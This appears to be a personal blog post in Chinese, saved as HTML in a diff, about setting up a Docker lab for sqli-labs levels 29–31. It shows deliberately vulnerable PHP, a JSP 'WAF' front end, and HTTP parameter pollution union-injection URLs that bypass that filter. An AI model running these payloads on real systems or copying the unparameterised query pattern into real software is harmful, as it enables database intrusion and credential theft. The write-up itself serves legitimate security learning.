@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言《mysql注入天书》中对于sqli-labs的Less-29到Less-32，解释为基于服务器架构上的sql注入。然而在环境的搭建上，现有的靶场都没能提供合适的Less-29到Less-32的环境。 以下为我对Less-29到Less-32环境的搭建和基于环境之上的学习。 环境1、设计： 这个架构图，展示了四个关卡的服务端架构，数据流经以tomcat为引擎的jsp型服务器，到以apache为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过sqli-labs学习基于服务器架构上的sql注入">
+<meta property="og:url" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;">
+<meta property="og:site_name" content="Rj45&#39;s blog">
+<meta property="og:description" content="前言《mysql注入天书》中对于sqli-labs的Less-29到Less-32，解释为基于服务器架构上的sql注入。然而在环境的搭建上，现有的靶场都没能提供合适的Less-29到Less-32的环境。 以下为我对Less-29到Less-32环境的搭建和基于环境之上的学习。 环境1、设计： 这个架构图，展示了四个关卡的服务端架构，数据流经以tomcat为引擎的jsp型服务器，到以apache为">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;6.png">
+<meta property="og:updated_time" content="2019-10-03T13:31:27.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5&#x2F;1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/my.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/my.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/my.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>通过sqli-labs学习基于服务器架构上的sql注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+<link rel="alternate" href="/atom.xml" title="Rj45's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/%E5%85%B3%E4%BA%8Edocker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%BA%86%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/pwn%E5%AD%A6%E4%B9%A0%E5%8F%91%E5%B1%95%E8%B7%AF%E7%BA%BF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&text=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&is_video=false&description=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通过sqli-labs学习基于服务器架构上的sql注入&body=Check out this article: https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&name=通过sqli-labs学习基于服务器架构上的sql注入&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-29"><span class="toc-number">3.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-30"><span class="toc-number">4.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-31"><span class="toc-number">5.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        通过sqli-labs学习基于服务器架构上的sql注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-02T09:03:04.000Z" itemprop="datePublished">2019-10-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>《mysql注入天书》中对于sqli-labs的Less-29到Less-32，解释为基于服务器架构上的sql注入。<br>然而在环境的搭建上，现有的靶场都没能提供合适的Less-29到Less-32的环境。</p>
+<p>以下为我对Less-29到Less-32环境的搭建和基于环境之上的学习。</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>1、设计：</p>
+<p>这个架构图，展示了四个关卡的服务端架构，数据流经以tomcat为引擎的jsp型服务器，到以apache为引擎的php服务器。</p>
+<p>真正提供web服务的是php服务器，而jsp服务器类似WAF的作用。</p>
+<p><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/1.png" alt></p>
+<p>整体的环境搭建，我计划采用docker进行设计，以tomcat镜像和sqli-labs镜像作为主体，创建两个容器于同一网络中，apache容器连接到tomcat容器，再将tomcat容器暴露出来用于访问。</p>
+<p>2、搭建<br>1）创建网桥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create --driver=bridge --subnet=192.168.1.0/24 --gateway=192.168.1.1 my-net</span><br></pre></td></tr></table></figure>
+<p>2）搭建sqli-labs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 8080:80 --name=sqli-labs --network=my-net acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
+<p>3）搭建tomcat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 80:8080 --network=my-net -v /home/cloudn/tomcat/webapps/:/usr/local/tomcat/webapps --name=tomcat2sqli-labs tomcat</span><br></pre></td></tr></table></figure>
+<p>4）初始化sqli-labs</p>
+<p>5）删除DNAT规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -t nat -nL</span><br><span class="line">sudo iptables -t nat -nL --line-number</span><br><span class="line">sudo iptables -t nat -D DOCKER 4</span><br></pre></td></tr></table></figure>
+<p><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/4.png" alt><br>可是在实际删除后，仍然可以访问到容器。这个点尚待思考。<br>6）部署关卡</p>
+<p>修改路径：</p>
+<p><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/2.png" alt></p>
+<p>5）测试<br><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
+<h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>1、代码：<br>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">//disable error reporting</span><br><span class="line">error_reporting(0);</span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">        $id=$_GET[&apos;id&apos;];</span><br><span class="line">        //logging the connection parameters to a file for analysis.</span><br><span class="line">        $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">        fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        $qs = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line">        $hint=$qs;</span><br><span class="line">// connectivity</span><br><span class="line">        $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">        $result=mysql_query($sql);</span><br><span class="line">        $row = mysql_fetch_array($result);</span><br><span class="line">        if($row)</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">                echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">                echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">                echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">        else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>index.jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">        String id = request.getParameter(&quot;id&quot;);</span><br><span class="line">        String qs = request.getQueryString();</span><br><span class="line"></span><br><span class="line">        if(id!=null)</span><br><span class="line">        &#123;</span><br><span class="line">                if(id!=&quot;&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                        try</span><br><span class="line">                        &#123;</span><br><span class="line">                                String rex = &quot;^\\d+$&quot;;//对参数进行解析处理，只解析第一个</span><br><span class="line">                                Boolean match=id.matches(rex);</span><br><span class="line">                                if(match == true)</span><br><span class="line">                                &#123;</span><br><span class="line">                                        URL sqli_labs = new URL(&quot;http://192.168.1.2/Less-29/index.php?&quot;+ qs);//将数据转发到apache</span><br><span class="line">                                URLConnection sqli_labs_connection = sqli_labs.openConnection();</span><br><span class="line">                                BufferedReader in = new BufferedReader(</span><br><span class="line">                                                        new InputStreamReader(</span><br><span class="line">                                                        sqli_labs_connection.getInputStream()));</span><br><span class="line">                                String inputLine;</span><br><span class="line">                                while ((inputLine = in.readLine()) != null)</span><br><span class="line">                                    out.print(inputLine);</span><br><span class="line">                                in.close();</span><br><span class="line">                                &#125;</span><br><span class="line">                                else</span><br><span class="line">                                &#123;</span><br><span class="line">                                        response.sendRedirect(&quot;hacked.jsp&quot;);</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        catch (Exception ex)</span><br><span class="line">                        &#123;</span><br><span class="line">                                out.print(&quot;&lt;font color= &apos;#FFFF00&apos;&gt;&quot;);</span><br><span class="line">                                out.println(ex);</span><br><span class="line">                                out.print(&quot;&lt;/font&gt;&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        finally</span><br><span class="line">                        &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">                URL sqli_labs = new URL(&quot;http://192.168.1.2/Less-29/index.php&quot;);</span><br><span class="line">        URLConnection sqli_labs_connection = sqli_labs.openConnection();</span><br><span class="line">        BufferedReader in = new BufferedReader(</span><br><span class="line">                                new InputStreamReader(</span><br><span class="line">                                sqli_labs_connection.getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        while ((inputLine = in.readLine()) != null)</span><br><span class="line">            out.print(inputLine);</span><br><span class="line">        in.close();</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，根据前面的架构，tomcat的作用类似waf，将数据进行过滤处理，然后转发给apache。</p>
+<p>2、不同服务器对参数的解析不同：</p>
+<p><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/5.png" alt><br>tomcat解析第一个，apache解析最后一个。</p>
+<p>3、构造联合注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/Less-29/index.jsp?id=1&amp;id=-2&apos; union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
+<h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><p>1、代码<br>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; .$id. &apos;&quot;&apos;;</span><br></pre></td></tr></table></figure>
+<p>闭合符号改为双引号<br>2、注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/Less-30/index.jsp?id=1&amp;id=-2&quot; union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
+<h1 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h1><p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; .$id. &apos;&quot;&apos;;</span><br><span class="line"> $sql=&quot;SELECT * FROM users WHERE id= ($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>闭合符号改为<code>&quot;()&quot;</code><br>2、注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/Less-31/index.jsp?id=1&amp;id=-2&quot;) union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《mysql注入天书》</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-29"><span class="toc-number">3.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-30"><span class="toc-number">4.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-31"><span class="toc-number">5.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&text=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
